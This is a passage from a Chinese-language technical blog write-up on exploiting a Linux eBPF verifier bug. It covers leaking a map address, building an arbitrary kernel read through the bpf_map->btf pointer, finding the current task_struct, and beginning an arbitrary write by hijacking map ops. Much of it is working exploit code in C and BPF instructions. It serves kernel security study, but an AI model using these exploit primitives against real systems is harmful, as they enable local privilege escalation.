class="hljs-comment"> * incorrectly propagated into other registers by find_equal_scalars()</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;id = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br>src_reg = &amp;regs[insn-&gt;src_reg];<br><span class="hljs-keyword">if</span> (src_reg-&gt;type != SCALAR_VALUE) &#123;<br><span class="hljs-comment">//...</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ptr_reg) &#123;<br><span class="hljs-comment">/* pointer += scalar */</span><br>err = mark_chain_precision(env, insn-&gt;src_reg);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><span class="hljs-keyword">return</span> adjust_ptr_min_max_vals(env, insn,<br>       dst_reg, src_reg);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而在 <code>adjust_ptr_min_max_vals()</code> 当中有这样一个逻辑：如果源寄存器的边界存在 <code>smin_val &gt; smax_val || umin_val &gt; umax_val</code> 的情况，<strong>则直接将目的寄存器设为 unknown</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_ptr_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> bpf_insn *insn,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_reg_state *ptr_reg,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_reg_state *off_reg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_verifier_state</span> *<span class="hljs-title">vstate</span> =</span> env-&gt;cur_state;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_state</span> *<span class="hljs-title">state</span> =</span> vstate-&gt;frame[vstate-&gt;curframe];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> state-&gt;regs, *dst_reg;<br><span class="hljs-type">bool</span> known = tnum_is_const(off_reg-&gt;var_off);<br>s64 smin_val = off_reg-&gt;smin_value, smax_val = off_reg-&gt;smax_value,<br>    smin_ptr = ptr_reg-&gt;smin_value, smax_ptr = ptr_reg-&gt;smax_value;<br>u64 umin_val = off_reg-&gt;umin_value, umax_val = off_reg-&gt;umax_value,<br>    umin_ptr = ptr_reg-&gt;umin_value, umax_ptr = ptr_reg-&gt;umax_value;<br>u32 dst = insn-&gt;dst_reg, src = insn-&gt;src_reg;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-type">int</span> ret;<br><br>dst_reg = &amp;regs[dst];<br><br><span class="hljs-keyword">if</span> ((known &amp;&amp; (smin_val != smax_val || umin_val != umax_val)) ||<br>    smin_val &gt; smax_val || umin_val &gt; umax_val) &#123;<br><span class="hljs-comment">/* Taint dst register if offset had invalid bounds derived from</span><br><span class="hljs-comment"> * e.g. dead branches.</span><br><span class="hljs-comment"> */</span><br>__mark_reg_unknown(env, dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>而 <code>__mark_reg_unknown()</code> 则会<strong>直接将寄存器设为标量值类型，这样的值可以直接存入 map 而不会被 verifier 限制</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __mark_reg_unknown(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_verifier_env *env,<br>       <span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Clear type, id, off, and union(map_ptr, range) and</span><br><span class="hljs-comment"> * padding between &#x27;type&#x27; and union</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">memset</span>(reg, <span class="hljs-number">0</span>, offsetof(<span class="hljs-keyword">struct</span> bpf_reg_state, var_off));<br>reg-&gt;type = SCALAR_VALUE;<br>reg-&gt;var_off = tnum_unknown;<br>reg-&gt;frameno = <span class="hljs-number">0</span>;<br>reg-&gt;precise = env-&gt;subprog_cnt &gt; <span class="hljs-number">1</span> || !env-&gt;bpf_capable;<br>__mark_reg_unbounded(reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>由此我们便可以通过将指针寄存器与一个漏洞寄存器进行算术运算来绕过这个限制，从而泄露出 map 的地址，需要注意的是<strong>我们的漏洞寄存器的第 33 位是 unknown 的，我们需要将其进行截断以消去</strong>：</p><blockquote><p>我们应当尽量减少截断时 verifier 对寄存器的跟踪，因此这里直接用 <code>mov</code> ，如果使用 <code>and 0xffffffff</code> 这样的操作则没法消除掉 unknown 位，少 and 几位则会导致寄存器边界值和 var_off 重新更新</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        LEAK_MAP_ADDR(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要注意我们获得的地址是指向 <code>bpf_array.value</code> 的，需要自行计算偏移：</p><p><img src="https://s2.loli.net/2023/06/06/1KNx2MTmQ5A39Gp.png" alt="image.png"></p><blockquote><p>这里我们可以注意到 <code>bpf_map</code> <strong>并不在 direct mapping area 上</strong>，应该是调用了 vmalloc，笔者推测可能是因为我们分配的 map 太大的缘故：）</p></blockquote><h2 id="四、任意地址读，泄露进程地址"><a href="#四、任意地址读，泄露进程地址" class="headerlink" title="四、任意地址读，泄露进程地址"></a>四、任意地址读，泄露进程地址</h2><p>接下来我们考虑如何完成任意地址读，由于我们能够读写 <code>bpf_map</code> 中的数据，故考虑从此处下手：）</p><p><strong>BPF Type Format</strong>（BTF）是一种元数据格式，用于给 eBPF 提供一些额外的信息，在内核中使用 <code>btf</code> 结构体表示一条 btf 信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> &#123;</span><br><span class="hljs-type">void</span> *data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_type</span> **<span class="hljs-title">types</span>;</span><br>u32 *resolved_ids;<br>u32 *resolved_sizes;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strings;<br><span class="hljs-type">void</span> *nohdr_data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_header</span> <span class="hljs-title">hdr</span>;</span><br>u32 nr_types; <span class="hljs-comment">/* includes VOID for base BTF */</span><br>u32 types_size;<br>u32 data_size;<br><span class="hljs-type">refcount_t</span> refcnt;<br>u32 id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br><br><span class="hljs-comment">/* split BTF support */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">base_btf</span>;</span><br>u32 start_id; <span class="hljs-comment">/* first type ID in this BTF (0 for base BTF) */</span><br>u32 start_str_off; <span class="hljs-comment">/* first string offset (0 for base BTF) */</span><br><span class="hljs-type">char</span> name[MODULE_NAME_LEN];<br><span class="hljs-type">bool</span> kernel_btf;<br>&#125;;<br></code></pre></td></tr></table></figure><p>注意到在 <code>bpf_map</code> 当中刚好有一个指向 <code>struct btf</code> 的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> &#123;</span><br><span class="hljs-comment">//...</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br></code></pre></td></tr></table></figure><p> <code>bpf_map-&gt;btf</code> 在什么时候会被访问到？注意到 <code>bpf</code> 系统调用给我们提供的选项中有一个为 <code>BPF_OBJ_GET_INFO_BY_FD</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(bpf, <span class="hljs-type">int</span>, cmd, <span class="hljs-keyword">union</span> bpf_attr __user *, uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, size)<br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_OBJ_GET_INFO_BY_FD:<br>err = bpf_obj_get_info_by_fd(&amp;attr, uattr);<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>对于 map 类型而言最终会调用到 <code>bpf_map_get_info_by_fd()</code> ，在该函数中<strong>会把 bpf_map-&gt;btf.id 拷贝给用户空间</strong>： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_map_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>,</span><br><span class="hljs-params">  <span class="hljs-type">const</span> <span class="hljs-keyword">union</span> bpf_attr *attr,</span><br><span class="hljs-params">  <span class="hljs-keyword">union</span> bpf_attr __user *uattr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;btf) &#123;<br>info.btf_id = btf_obj_id(<span class="hljs-built_in">map</span>-&gt;btf);<br>info.btf_key_type_id = <span class="hljs-built_in">map</span>-&gt;btf_key_type_id;<br>info.btf_value_type_id = <span class="hljs-built_in">map</span>-&gt;btf_value_type_id;<br>&#125;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||<br>    put_user(info_len, &amp;uattr-&gt;info.info_len))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_obj_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">union</span> bpf_attr *attr,</span><br><span class="hljs-params">  <span class="hljs-keyword">union</span> bpf_attr __user *uattr)</span><br>&#123;<br><span class="hljs-type">int</span> ufd = attr-&gt;info.bpf_fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (CHECK_ATTR(BPF_OBJ_GET_INFO_BY_FD))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>f = fdget(ufd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADFD;<br><br><span class="hljs-keyword">if</span> (f.file-&gt;f_op == &amp;bpf_prog_fops)<br>err = bpf_prog_get_info_by_fd(f.file, f.file-&gt;private_data, attr,<br>      uattr);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f.file-&gt;f_op == &amp;bpf_map_fops)<br>err = bpf_map_get_info_by_fd(f.file, f.file-&gt;private_data, attr,<br>     uattr);<br></code></pre></td></tr></table></figure><p>我们不难想到的是<strong>我们可以通过控制 btf 指针的方式完成任意地址读</strong>，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* write the value into bpf_map-&gt;btf */</span>         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr_4_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        READ_ARBITRARY_ADDR(map_fd, idx), <br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .info.bpf_fd = map_fd,<br>        .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>        .info.info = (<span class="hljs-type">uint64_t</span>) &amp;info,<br>    &#125;;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> ret;<br><br>    ret = run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    data = info.btf_id;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    value[<span class="hljs-number">0</span>] = addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = addr + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    data = read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">2</span>);<br>    data &lt;&lt;= <span class="hljs-number">32</span>;<br>    data += read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><p>不过由于我们目前暂时不知道 <code>page_offset_base</code> ，因此暂时无法完成对所有物理内存搜索的工作，而只能读取内核镜像范围的内存</p><p>但是 <code>init</code> 进程的 PCB <code>init_task</code> 位于内核数据段上，<strong>init_task 的地址对我们来说是可知的</strong>，而<strong>所有进程在内核中的 PCB 构成一个双向链表，因此我们可以直接沿着这个双向链表搜索我们的进程控制块</strong>，判断是否搜索到的方法有很多，比如说对比 pid 一类的，这里笔者选择用 <code>prctl(PR_SET_NAME, &quot;arttnba3&quot;)</code> 来设置 <code>task_struct-&gt;comm</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> current_task;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">search_for_current_task</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="hljs-number">0x818</span>;<br>    <span class="hljs-type">size_t</span> data;<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        next_task = read_arbitrary_addr(map_fd, next_task);<br>        data = read_arbitrary_addr(map_fd, next_task + <span class="hljs-number">0x2d0</span>);<br>    &#125; <span class="hljs-keyword">while</span> (data != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    current_task = next_task - <span class="hljs-number">0x818</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current task_struct&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_task);<br>&#125;<br></code></pre></td></tr></table></figure><p>成功获得当前进程的 <code>task_struct</code> 地址：</p><p><img src="https://s2.loli.net/2023/06/06/tVo6viTK8C53Y1F.png" alt="image.png"></p><h2 id="五、任意地址写"><a href="#五、任意地址写" class="headerlink" title="五、任意地址写"></a>五、任意地址写</h2><p>我们同时有 map 的地址和内核基址，同时还能直接改写 map 内部的内容，不难想到的是我们可以直接在 map 上构造 fake map ops 后劫持 map 函数表从而劫持内核控制流</p><p>比较传统的方式就是直接栈迁移然后 ROP 执行 <code>commit_cred(&amp;init_cred)</code>，但笔者看到一个非常有意思的构造任意写的思路，所以这里也用这种解法（笑）</p><p>注意到 array map 的 <code>map_get_next_key()</code> 定义如下，当 <code>key</code> 小于 <code>map.max_entries</code> 时 <code>key</code> 会被写入到 <code>next_key</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Called from syscall */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">array_map_get_next_key</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *next_key)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> =</span> container_of(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_array, <span class="hljs-built_in">map</span>);<br>u32 index = key ? *(u32 *)key : U32_MAX;<br>u32 *next = (u32 *)next_key;<br><br><span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries) &#123;<br>*next = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (index == <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> -ENOENT;<br><br>*next = index + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>当然对于常规的调用 <code>map_get_next_key()</code> 的流程而言虽然 <code>key</code> 的内容是可控的但是 <code>next_key</code> 指针不是我们所能控制的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_get_next_key</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>next_key = kmalloc(<span class="hljs-built_in">map</span>-&gt;key_size, GFP_USER);<br><span class="hljs-comment">//...</span><br><br>rcu_read_lock();<br>err = <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_get_next_key(<span class="hljs-built_in">map</span>, key, next_key);<br></code></pre></td></tr></table></figure><p>但是在 map ops 当中有一些函数可以让我们控制这两个参数，<strong>我们可以将这样的函数指针替换为</strong>  <code>map_get_next_key()</code> <strong>从而完成任意地址写</strong>，例如 <code>map_push_elem()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> &#123;</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">int</span> (*map_push_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *value, u64 flags);<br></code></pre></td></tr></table></figure><p>当我们更新 eBPF map 时，若 map 类型为 <code>BPF_MAP_TYPE_QUEUE</code> 或 <code>BPF_MAP_TYPE_STACK</code> ，则这个函数会被调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_map_update_value</span><span class="hljs-params">(<span 